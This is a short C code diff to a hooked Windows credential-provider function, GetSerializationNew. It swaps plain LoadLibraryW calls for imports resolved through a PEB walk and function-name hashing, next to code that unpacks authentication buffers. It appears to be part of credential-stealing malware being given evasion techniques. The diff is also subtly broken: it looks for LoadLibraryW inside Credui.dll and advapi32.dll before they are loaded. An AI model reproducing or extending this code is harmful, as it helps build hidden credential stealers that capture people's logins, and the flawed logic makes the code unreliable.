@@ -165,10 +165,19 @@ HRESULT STDMETHODCALLTYPE GetSerializationNew(IUnknown* This, /* [out] */ PVOID 
 	if (!SUCCEEDED(hr))
 		return hr;
 
+
+	HMODULE hKernel32Base = GetModuleBaseFromPEB(L"Credui.dll");
+
+	FARPROC fpLoadLib = getFunctionByHash(hKernel32Base, H_LoadLibraryW);
+	customLoadLibraryW LoadLibraryW_ = (customLoadLibraryW)fpLoadLib;
 	
-	if ((hCredUI = LoadLibraryW(L"Credui.dll")))
+	if ((hCredUI = LoadLibraryW_(L"Credui.dll")))
 	{
-		if ((hAdvApi32 = LoadLibraryW(L"advapi32.dll")))
+		hKernel32Base = GetModuleBaseFromPEB(L"advapi32.dll");
+		fpLoadLib = getFunctionByHash(hKernel32Base, H_LoadLibraryW);
+		LoadLibraryW_ = (customLoadLibraryW)fpLoadLib;
+
+		if ((hAdvApi32 = LoadLibraryW_(L"advapi32.dll")))
 		{
 			// Resuelve las funciones por hash
 			DWORD hashCredUnpack = getHashFromString("CredUnPackAuthenticationBufferW");
